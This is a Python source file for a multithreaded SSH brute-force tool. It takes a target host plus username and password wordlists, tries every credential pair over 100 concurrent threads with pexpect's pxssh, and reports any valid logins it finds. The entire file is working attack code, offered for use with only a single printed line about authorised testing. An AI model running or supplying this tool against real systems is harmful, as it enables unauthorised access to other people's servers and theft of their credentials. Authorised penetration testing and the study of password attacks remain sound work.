import argparse
import pexpect
from pexpect import pxssh
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Global variables to store results and manage concurrency
found_credentials_lock = Lock()
found_credentials = []
attempt_count_lock = Lock()
current_attempts = 0 
max_attempts_overall = 0 

def attempt_login(host, username, password):
    """
    Attempts an SSH login for a single username/password pair.
    Reports success or failure.
    """
    global current_attempts

    with attempt_count_lock:
        current_attempts += 1
        if current_attempts % 100 == 0 or current_attempts == 1 or current_attempts == max_attempts_overall:
            print(f"[*] Attempting {current_attempts}/{max_attempts_overall}: {username}:{password}")

    try:
        # Initialize pxssh for each attempt as it manages its own connection state
        s = pxssh.pxssh(timeout=5) 
        s.login(host, username, password)
        
        # If successful, acquire lock and record credentials
        with found_credentials_lock:
            found_credentials.append({'username': username, 'password': password})
            print(f"\n[!!!] VALID CREDENTIALS FOUND: {username}:{password}")
            s.logout()
            return True # Indicate success
    except pxssh.ExceptionPxssh as e:
        # Authentication failed or connection error
        print(f"[-] Failed: {username}:{password} ({e})") 
        pass
    except Exception as e:
        # Catch any other unexpected errors
        print(f"[!] An unexpected error occurred for {username}:{password}: {e}")
    return False # Indicate failure

def main():
    """Main function to parse arguments and run the SSH brute-force."""
    global max_attempts_overall

    parser = argparse.ArgumentParser(
        prog='Python SSH Brute-Forcer',
        description='Attempts to brute-force SSH credentials using wordlists.',
        epilog='Example: python bruteforcer.py -t 192.168.1.1 -p passwords.txt -U admin'
    )
    parser.add_argument("--target", "-t", type=str, required=True, help="Target SSH IP address or hostname.")
    parser.add_argument("--passlist", "-p", type=str, required=True, help="Path to the password wordlist file.")
    parser.add_argument("--userlist", "-u", type=str, help="Path to the username wordlist file (optional, if not using -U).")
    parser.add_argument("--username", "-U", type=str, help="Single username to try (optional, if not using -u).")
    args = parser.parse_args()

    # Validate argument combination
    if not args.username and not args.userlist:
        parser.error("Either --username or --userlist must be provided.")
    if args.username and args.userlist:
        parser.error("Cannot use both --username and --userlist simultaneously. Choose one.")

    host = args.target

    try:
        with open(args.passlist, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading password list file: {e}")
        exit(1)

    if args.username:
        usernames = [args.username]
    else:
        try:
            with open(args.userlist, "r") as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error reading username list file: {e}")
            exit(1)

    # Calculate total attempts for progress tracking
    max_attempts_overall = len(usernames) * len(passwords)
    print(f"Starting SSH brute-force on {host} with {len(usernames)} usernames and {len(passwords)} passwords ({max_attempts_overall} total attempts).")
    print("This tool is for ethical use only on systems you are authorized to test.\n")

    # Use ThreadPoolExecutor for concurrent execution
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                # Submit each login attempt as a separate task to the executor
                future = executor.submit(attempt_login, host, username, password)
                futures.append(future)
        
        for future in futures:
            # Check if any credentials were found, and if so, potentially break early
            if found_credentials:
                executor.shutdown(wait=False, cancel_futures=True) # Try to stop remaining tasks
                break
            future.result() # This will re-raise exceptions if any occurred in the thread

    if found_credentials:
        print("\n--- Scan Complete ---")
        print("Found the following valid credentials:")
        for cred in found_credentials:
            print(f"  Username: {cred['username']}, Password: {cred['password']}")
    else:
        print("\n--- Scan Complete ---")
        print("No valid credentials found within the provided wordlists.")

if __name__ == '__main__':
    main()
